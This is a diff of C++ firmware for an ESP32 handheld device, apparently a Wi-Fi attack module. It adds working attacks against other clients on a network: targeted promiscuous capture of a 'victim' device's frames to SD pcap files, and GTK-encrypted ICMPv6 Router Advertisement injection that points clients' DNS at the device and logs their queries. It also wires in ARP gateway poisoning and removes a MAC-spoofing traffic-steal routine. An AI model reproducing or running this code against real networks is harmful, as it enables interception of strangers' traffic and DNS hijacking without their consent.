@@ -29,29 +29,38 @@
 #include <lwip/netif.h>
 #include <lwip/tcpip.h>            // LOCK_TCPIP_CORE
 #include <ESP32Ping.h>            // bounce: reach the victim via the gateway at IP layer
+#include <SD.h>
+#include "sdcard_manager.h"       // portdown capture → /apps/isoscan/NNN.pcap
+#include "pcap_writer.h"          // libpcap writer (linktype 105)
+#include "wifi_sd_guard.h"        // ScopedPromiscPause — GDMA-safe SD writes
+#include <WiFiUdp.h>              // RA DNS poison: UDP-53 DNS-query listener
+#include <esp_netif.h>           // RA DNS poison: our link-local IPv6 for RDNSS
 
 extern DisplayManager displayManager;
 extern InputHandling  inputHandler;
+extern SDCardManager  sdCardManager;
 
 // ── attacks ────────────────────────────────────────────────────────────────────
 enum IsoAttack {
     ISO_NONE = 0,
     ISO_INJECT,     // BUILT: GTK-encrypt a broadcast ARP → reachability probe
-    ISO_BOUNCE,     // stub: reach the victim at IP layer via the gateway MAC
-    ISO_BCAST,      // stub: to-DS broadcast w/ victim IP → prove inject viability
-    ISO_PORTDOWN,   // stub: steal victim's incoming traffic (spoof victim MAC)
+    ISO_BOUNCE,     // BUILT: reach the victim at IP layer via the gateway
+    ISO_BCAST,      // note: not separately injectable (needs our PTK)
+    ISO_PORTDOWN,   // BUILT: capture victim frames → SD pcap (non-disruptive)
     ISO_PORTUP,     // BUILT: gateway ARP-poison → redirect victim's uplink to us
-    ISO_AUTO        // stub: run all, report which succeed
+    ISO_RADNS,      // BUILT: ICMPv6 RA DNS poison + UDP-53 query logger
+    ISO_AUTO        // BUILT: one-shot bounce reachability sweep
 };
 
 struct IsoAttackInfo { IsoAttack id; const char* key; const char* label; const char* desc; };
 static const IsoAttackInfo ISO_ATTACKS[] = {
     { ISO_INJECT,   "inject",   "Inject (GTK broadcast ARP)", "GTK-encrypt broadcast ARP → reachability probe" },
-    { ISO_BOUNCE,   "bounce",   "Gateway bounce",         "Reach victim via gateway MAC (IP layer)" },
-    { ISO_BCAST,    "bcast",    "Broadcast probe",        "to-DS broadcast w/ victim IP → viability test" },
-    { ISO_PORTDOWN, "portdown", "Port steal (inbound)",   "Spoof victim MAC → steal incoming traffic" },
-    { ISO_PORTUP,   "portup",   "Gateway poison (uplink)", "ARP-poison victim's gateway -> redirect traffic to us" },
-    { ISO_AUTO,     "auto",     "Auto (run all)",         "Try every attack, report what works" },
+    { ISO_BOUNCE,   "bounce",   "Gateway bounce",         "Reach victim via gateway (IP layer)" },
+    { ISO_PORTUP,   "portup",   "Gateway poison (uplink)", "ARP-poison victim's gateway → redirect to us" },
+    { ISO_PORTDOWN, "portdown", "Victim capture -> SD",   "Log victim's frames to /apps/isoscan pcap" },
+    { ISO_RADNS,    "dns",      "RA DNS poison",          "ICMPv6 RA → point victim DNS at us, log queries" },
+    { ISO_BCAST,    "bcast",    "Broadcast probe",        "(covered by inject/bounce - needs PTK)" },
+    { ISO_AUTO,     "auto",     "Auto (reachability)",    "One-shot bounce reachability sweep" },
 };
 static const int ISO_ATTACK_N = (int)(sizeof(ISO_ATTACKS) / sizeof(ISO_ATTACKS[0]));
 
@@ -436,19 +445,36 @@ static void isoGwPoison(int idx) {
     dm.clearScreen(); dm.printCommandScreen();
 }
 
-// portdown capture: count data frames whose A1 (dest) == the cloned victim MAC —
-// traffic the AP now hands us because we stole the victim's MAC.
-static volatile bool     s_victimSteal = false;
-static volatile uint32_t s_stealCount  = 0;
-static volatile uint8_t  s_stealMac[6];
-static void isoStealCb(void* buf, wifi_promiscuous_pkt_type_t t) {
-    if (!s_victimSteal || t != WIFI_PKT_DATA) return;
+// portdown capture ring — promiscuous grabs every 802.11 data frame that mentions
+// the victim MAC (A1/A2/A3) into a RAM ring; the main loop drains it to an SD pcap
+// with promiscuous paused (GDMA rule). Non-disruptive: no MAC change, we stay
+// associated. Captures the group traffic + anything a poison redirects our way.
+#define ISO_CAP_RING 16
+#define ISO_CAP_MAX  288
+struct IsoCapFrame { uint16_t len; uint32_t ts; uint8_t data[ISO_CAP_MAX]; };
+static volatile IsoCapFrame s_capRing[ISO_CAP_RING];
+static volatile uint8_t     s_capHead = 0, s_capTail = 0;
+static volatile uint8_t     s_capVic[6];
+static volatile bool        s_capActive = false;
+static volatile uint32_t    s_capSeen = 0, s_capDropped = 0;
+
+static void isoCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
+    if (!s_capActive || t != WIFI_PKT_DATA) return;
     wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
-    if (pk->rx_ctrl.sig_len < 24) return;
+    int len = pk->rx_ctrl.sig_len;
+    if (len < 24 || len > 2000) return;
     const uint8_t* f = pk->payload;
-    uint16_t fc = f[0] | (f[1] << 8);
-    if (!((fc >> 9) & 1)) return;                    // FromDS → A1 = destination
-    if (memcmp(f + 4, (const void*)s_stealMac, 6) == 0) s_stealCount++;
+    if (memcmp(f + 4,  (const void*)s_capVic, 6) != 0 &&     // A1 dest
+        memcmp(f + 10, (const void*)s_capVic, 6) != 0 &&     // A2
+        memcmp(f + 16, (const void*)s_capVic, 6) != 0) return; // A3
+    s_capSeen++;
+    uint8_t nx = (uint8_t)((s_capHead + 1) % ISO_CAP_RING);
+    if (nx == s_capTail) { s_capDropped++; return; }
+    int n = len > ISO_CAP_MAX ? ISO_CAP_MAX : len;
+    memcpy((void*)s_capRing[s_capHead].data, f, n);
+    s_capRing[s_capHead].len = (uint16_t)n;
+    s_capRing[s_capHead].ts  = millis();
+    s_capHead = nx;
 }
 
 // ── gateway MAC resolver (bounce needs it; the gateway is reachable even under
@@ -516,65 +542,95 @@ static void isoBounce(int idx) {
     dm.printCommandScreen();
 }
 
-// ── portdown — MAC-spoof to steal the victim's INBOUND traffic (downlink) ────────
-// Clone the victim's MAC so the AP's forwarding table maps that MAC to our radio
-// and hands us its incoming frames. DISRUPTIVE: MAC conflict with the real victim,
-// and it drops+reconnects our own WiFi (esp_wifi_set_mac needs the IF stopped,
-// per mac_changer). The original MAC is restored on EVERY exit path (plan's rule).
-static void isoSetStaMac(const uint8_t* mac) {         // mirrors MacChanger::applyMac
-    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
-    esp_wifi_stop();
-    esp_wifi_set_mac(WIFI_IF_STA, (uint8_t*)mac);
-    esp_wifi_start();
-    delay(300);
-}
+// ── portdown — targeted victim capture → SD pcap (non-disruptive) ────────────────
+// Promiscuous-captures every 802.11 data frame mentioning the victim MAC and logs
+// it to /apps/isoscan/NNN.pcap (Wireshark/aircrack compatible). Does NOT change our
+// MAC and does NOT drop our connection. On an isolated net it sees the group frames
+// involving the victim (+ anything a gateway-poison run redirects our way); on an
+// L2 AP with a poison active it captures the redirected downlink. GDMA-safe: frames
+// ring in RAM, flushed to SD with promiscuous paused.
 static void isoPortDown(int idx) {
     auto& dm = displayManager;
-    isoHeader("port steal: downlink");
+    isoHeader("victim capture");
     uint8_t vic[6];
     if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return; }
-    uint8_t orig[6]; esp_wifi_get_mac(WIFI_IF_STA, orig);
+    if (!sdCardManager.isReady()) {
+        dm.setTextColor(TFT_RED); dm.println("No SD — capture needs it.");
+        dm.printCommandScreen(); return;
+    }
 
-    char b[48];
+    // Allocate the pcap file (promiscuous still off → plain SD I/O).
+    char path[40]; uint16_t seq = 1;
+    sdCardManager.ensureDir(SD_DIR_ISOSCAN);
+    while (seq <= 999) {
+        snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/%03u.pcap", seq);
+        if (!SD.exists(path)) break;
+        seq++;
+    }
+    File cap = SD.open(path, FILE_WRITE);
+    if (!cap) { dm.setTextColor(TFT_RED); dm.println("SD open failed."); dm.printCommandScreen(); return; }
+    pcap::writeGlobalHeader(cap);
+
+    char b[56];
     isoMacStr(vic, b, sizeof(b));
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("clone MAC");
-    dm.setTextColor(TFT_CYAN);     dm.setCursor(72, outputY + LINE_HEIGHT * 2); dm.printText(b);
-    dm.setTextColor(TFT_RED);      dm.setCursor(6, outputY + LINE_HEIGHT * 4);
-    dm.printText("Reconnecting as the victim...");
-    dm.setTextColor(0x7BEF);       dm.setCursor(6, outputY + LINE_HEIGHT * 6);
-    dm.printText("Its inbound traffic should now");
-    dm.setCursor(6, outputY + LINE_HEIGHT * 7); dm.printText("route to us (MAC conflict).");
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] stop + restore MAC");
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("victim");
+    dm.setTextColor(TFT_CYAN);     dm.setCursor(56, outputY + LINE_HEIGHT * 2); dm.printText(b);
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("file");
+    dm.setTextColor(0x6FE8);       dm.setCursor(56, outputY + LINE_HEIGHT * 3); dm.printText(path);
 
-    isoSetStaMac(vic);                               // become the victim
-    WiFi.reconnect();
-
-    // Hold the spoof, promiscuous-sniff frames now addressed to the victim MAC.
-    uint32_t rx = 0, lastDraw = 0;
-    s_victimSteal = true; s_stealCount = 0; memcpy((void*)s_stealMac, vic, 6);
+    // Arm capture.
+    s_capHead = s_capTail = 0; s_capSeen = s_capDropped = 0;
+    memcpy((void*)s_capVic, vic, 6); s_capActive = true;
     wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
     esp_wifi_set_promiscuous_filter(&flt);
-    esp_wifi_set_promiscuous_rx_cb(isoStealCb);
+    esp_wifi_set_promiscuous_rx_cb(isoCapCb);
     esp_wifi_set_promiscuous(true);
+
+    uint32_t written = 0, lastDraw = 0, lastFlush = 0;
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] stop + save");
     while (true) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
-        rx = s_stealCount;
+
+        // Flush drained frames to SD with promiscuous paused (GDMA rule).
+        uint8_t fill = (uint8_t)((s_capHead - s_capTail) & (ISO_CAP_RING - 1));
+        if (fill && (millis() - lastFlush >= 1500 || fill > ISO_CAP_RING / 2)) {
+            lastFlush = millis();
+            ScopedPromiscPause _;
+            while (s_capTail != s_capHead) {
+                IsoCapFrame fr;
+                memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
+                s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
+                pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
+                written++;
+            }
+            cap.flush();
+        }
+
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
         if (!dm.isBlocked() && millis() - lastDraw >= 500) {
-            snprintf(b, sizeof(b), "frames to victim MAC: %lu", (unsigned long)rx);
-            dm.fillRect(0, outputY + LINE_HEIGHT * 9, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
-            dm.setTextColor(rx ? TFT_GREEN : TFT_DARKGREY);
-            dm.setCursor(6, outputY + LINE_HEIGHT * 9); dm.printText(b);
+            snprintf(b, sizeof(b), "seen %lu  saved %lu  drop %lu",
+                     (unsigned long)s_capSeen, (unsigned long)written, (unsigned long)s_capDropped);
+            dm.fillRect(0, outputY + LINE_HEIGHT * 6, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
+            dm.setTextColor(s_capSeen ? TFT_GREEN : TFT_DARKGREY);
+            dm.setCursor(6, outputY + LINE_HEIGHT * 6); dm.printText(b);
             lastDraw = millis();
         }
         vTaskDelay(pdMS_TO_TICKS(20));
     }
+
+    // Stop capture, final drain, close (promiscuous off → plain SD).
+    s_capActive = false;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
-    s_victimSteal = false;
-
-    isoSetStaMac(orig);                              // ALWAYS restore our identity
-    WiFi.reconnect();
+    while (s_capTail != s_capHead) {
+        IsoCapFrame fr;
+        memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
+        s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
+        pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
+        written++;
+    }
+    cap.close();
     dm.clearScreen(); dm.printCommandScreen();
 }
 
@@ -586,6 +642,183 @@ static void isoAuto(int idx) {
     isoBounce(idx);
 }
 
+// ── RA DNS poison — ICMPv6 Router Advertisement pointing the victim's DNS at us ──
+// Injects a GTK-encrypted multicast (ff02::1) RA carrying an RDNSS option = our
+// link-local IPv6. A victim that honors it uses us as its DNS server; a UDP-53
+// listener logs the queries to SD. Needs IPv6 (enabled here) and, like all
+// interception, a network that lets the victim's query reach us (an L2 AP; a phone
+// hotspot's isolation blocks the return path). HW-gated — build/verify at the lab.
+
+// Internet checksum over the ICMPv6 pseudo-header + message (cksum field = 0).
+static uint16_t isoIcmp6Cksum(const uint8_t* s16, const uint8_t* d16, const uint8_t* m, int mlen) {
+    uint32_t sum = 0;
+    for (int i = 0; i < 16; i += 2) sum += (uint16_t)((s16[i] << 8) | s16[i + 1]);
+    for (int i = 0; i < 16; i += 2) sum += (uint16_t)((d16[i] << 8) | d16[i + 1]);
+    sum += (uint32_t)mlen;                           // upper-layer length
+    sum += 58;                                       // next header = ICMPv6
+    for (int i = 0; i < mlen; i += 2)
+        sum += (uint16_t)((m[i] << 8) | (i + 1 < mlen ? m[i + 1] : 0));
+    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
+    return (uint16_t)~sum;
+}
+
+// LLC/SNAP + IPv6 + ICMPv6 RA(RDNSS = ll) into p. Returns length (88).
+static int isoBuildRA(const uint8_t ll[16], uint8_t* p) {
+    static const uint8_t snap[8]     = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x86, 0xDD };
+    static const uint8_t allNodes[16]= { 0xFF, 0x02, 0,0,0,0,0,0,0,0,0,0,0,0,0, 0x01 };
+    memcpy(p, snap, 8);
+    uint8_t* ip6 = p + 8;
+
+    uint8_t icmp[40];
+    memset(icmp, 0, sizeof(icmp));
+    icmp[0] = 134;                                   // Router Advertisement
+    icmp[4] = 64;                                    // cur hop limit
+    // router lifetime 0 (DNS-only, not a default route); reachable/retrans = 0
+    icmp[16] = 25;                                   // RDNSS option
+    icmp[17] = 3;                                    // length in 8-byte units (8 + 16)
+    icmp[20] = icmp[21] = icmp[22] = icmp[23] = 0xFF; // RDNSS lifetime = ~infinite
+    memcpy(icmp + 24, ll, 16);                       // DNS server = our link-local
+
+    memset(ip6, 0, 40);
+    ip6[0] = 0x60;                                   // version 6
+    ip6[4] = 0; ip6[5] = 40;                         // payload length = ICMPv6 len
+    ip6[6] = 58;                                     // next header = ICMPv6
+    ip6[7] = 255;                                    // hop limit (required for RA)
+    memcpy(ip6 + 8,  ll, 16);                        // src = our link-local
+    memcpy(ip6 + 24, allNodes, 16);                  // dst = ff02::1
+
+    uint16_t ck = isoIcmp6Cksum(ip6 + 8, ip6 + 24, icmp, 40);
+    icmp[2] = (uint8_t)(ck >> 8); icmp[3] = (uint8_t)(ck & 0xff);
+    memcpy(ip6 + 40, icmp, 40);
+    return 8 + 40 + 40;
+}
+
+// Parse the first QNAME out of a DNS query payload (header 12B + labels).
+static bool isoDnsName(const uint8_t* b, int len, char* out, int outsz) {
+    if (len < 13) return false;
+    int o = 12, on = 0;
+    while (o < len) {
+        uint8_t l = b[o++];
+        if (l == 0) break;
+        if (l & 0xC0) return false;                  // no compression in a query
+        if (o + l > len) return false;
+        for (int i = 0; i < l; i++)
+            if (on < outsz - 1) { char c = b[o + i]; out[on++] = (c >= 32 && c < 127) ? c : '?'; }
+        if (on < outsz - 1) out[on++] = '.';
+        o += l;
+    }
+    if (on > 0 && out[on - 1] == '.') on--;
+    out[on] = '\0';
+    return on > 0;
+}
+
+static void isoRaDns(int idx) {
+    auto& dm = displayManager;
+    (void)idx;                                       // RA is multicast — hits all clients
+    isoHeader("RA DNS poison");
+    uint8_t gtk[32]; int glen = 0;
+    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
+        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
+    }
+    const uint8_t* bm = WiFi.BSSID();
+    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
+    uint8_t bssid[6]; memcpy(bssid, bm, 6);
+    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
+
+    dm.setTextColor(0x7BEF); dm.println("Bringing up IPv6 link-local...");
+    WiFi.enableIpV6();
+    esp_netif_t* nif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    uint8_t ll[16]; bool haveLL = false;
+    if (nif) {
+        esp_netif_create_ip6_linklocal(nif);
+        for (int t = 0; t < 30 && !haveLL; t++) {
+            esp_ip6_addr_t a;
+            if (esp_netif_get_ip6_linklocal(nif, &a) == ESP_OK) { memcpy(ll, a.addr, 16); haveLL = true; break; }
+            char k = inputHandler.getKeyboardInput();
+            if (k == 'q' || k == 'Q') { dm.printCommandScreen(); return; }
+            vTaskDelay(pdMS_TO_TICKS(200));
+        }
+    }
+    if (!haveLL) { dm.setTextColor(TFT_RED); dm.println("No IPv6 link-local."); dm.printCommandScreen(); return; }
+
+    // DNS query log (STA mode — plain SD I/O, no promiscuous here).
+    File log; char path[40] = "";
+    if (sdCardManager.isReady()) {
+        sdCardManager.ensureDir(SD_DIR_ISOSCAN);
+        uint16_t seq = 1;
+        while (seq <= 999) { snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/dns_%03u.csv", seq); if (!SD.exists(path)) break; seq++; }
+        log = SD.open(path, FILE_WRITE);
+        if (log) log.println("time_ms,src_ip,query");
+    }
+    WiFiUDP udp; udp.begin(53);
+
+    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
+    uint32_t raSent = 0, dnsRx = 0, lastRA = 0, lastDraw = 0;
+    char lastQ[40] = "";
+    char llShort[24]; snprintf(llShort, sizeof(llShort), "fe80::..%02x%02x", ll[14], ll[15]);
+
+    while (true) {
+        char k = inputHandler.getKeyboardInput();
+        if (k == 'q' || k == 'Q') break;
+        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }
+
+        if (millis() - lastRA >= 2000) {             // RAs are periodic — 2s is plenty
+            lastRA = millis();
+            uint8_t pnb[6]; for (int i = 0; i < 6; i++) pnb[i] = (uint8_t)((pn >> (8 * i)) & 0xff);
+            uint8_t hdr[24]; isoBuildHdr(bssid, src, seq++, hdr);
+            static const uint8_t m6[6] = { 0x33, 0x33, 0x00, 0x00, 0x00, 0x01 };
+            memcpy(hdr + 4, m6, 6);                   // A1 = IPv6 all-nodes multicast
+            uint8_t plain[128]; int plen = isoBuildRA(ll, plain);
+            uint8_t enc[160];
+            int elen = isoCcmpEncrypt(gtk, 16, hdr, keyid, pnb, plain, plen, enc, sizeof(enc));
+            if (elen > 0) {
+                uint8_t frame[192]; memcpy(frame, hdr, 24); memcpy(frame + 24, enc, elen);
+                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false) == ESP_OK) raSent++;
+                pn++;
+            }
+            lastDraw = 0;
+        }
+
+        int n = udp.parsePacket();
+        if (n > 0) {
+            uint8_t buf[256]; int r = udp.read(buf, sizeof(buf));
+            char dom[40];
+            if (r > 0 && isoDnsName(buf, r, dom, sizeof(dom))) {
+                dnsRx++; strncpy(lastQ, dom, sizeof(lastQ) - 1); lastQ[sizeof(lastQ) - 1] = '\0';
+                if (log) {
+                    IPAddress ri = udp.remoteIP();
+                    char line[80]; snprintf(line, sizeof(line), "%lu,%u.%u.%u.%u,%s",
+                        (unsigned long)millis(), ri[0], ri[1], ri[2], ri[3], dom);
+                    log.println(line); log.flush();
+                }
+                lastDraw = 0;
+            }
+        }
+
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
+        if (!dm.isBlocked() && millis() - lastDraw >= 400) {
+            char b[56]; int y = outputY + LINE_HEIGHT * 2;
+            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("our DNS");
+            dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(llShort); y += LINE_HEIGHT + 4;
+            snprintf(b, sizeof(b), "RA sent : %lu (keyid %u)", (unsigned long)raSent, keyid);
+            dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
+            snprintf(b, sizeof(b), "DNS rcvd: %lu", (unsigned long)dnsRx);
+            dm.setTextColor(dnsRx ? TFT_GREEN : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
+            if (lastQ[0]) {
+                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("last:");
+                dm.setTextColor(TFT_CYAN);     dm.setCursor(48, y); dm.printText(lastQ);
+            }
+            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid   [q] stop");
+            lastDraw = millis();
+        }
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+
+    udp.stop();
+    if (log) log.close();
+    dm.clearScreen(); dm.printCommandScreen();
+}
+
 // ── attack dispatch ──────────────────────────────────────────────────────────────
 static void isoRunAttack(int idx, IsoAttack attack) {
     auto& dm = displayManager;
@@ -594,6 +827,7 @@ static void isoRunAttack(int idx, IsoAttack attack) {
         case ISO_PORTUP:   isoGwPoison(idx);  return;
         case ISO_BOUNCE:   isoBounce(idx);    return;
         case ISO_PORTDOWN: isoPortDown(idx);  return;
+        case ISO_RADNS:    isoRaDns(idx);     return;
         case ISO_AUTO:     isoAuto(idx);      return;
         default: break;                       // ISO_BCAST falls through
     }
